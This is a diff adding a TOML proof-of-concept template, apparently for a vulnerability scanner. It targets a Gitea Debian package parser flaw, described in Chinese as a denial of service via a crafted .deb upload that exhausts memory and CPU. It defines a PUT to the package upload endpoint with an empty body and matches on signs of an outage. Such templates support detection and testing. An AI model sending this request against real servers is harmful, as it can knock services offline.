@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "通过上传特制 .deb 文件触发 Gitea Debian 包解析器的未限制解压漏洞和 O(N²) 字符串拼接问题，导致服务器内存耗尽和 CPU 饱和"
+id = "POC-AVE-2026-0646"
+name = "CVE-2026-56755 PoC"
+severity = "high"
+tags = ["cve-2026-56755"]
+vuln_id = [
+    "CVE-2026-56755",
+    "AVE-2026-0646",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/api/packages/{{owner}}/debian/pool/main/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/octet-stream"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "refused",
+    "unavailable",
+]
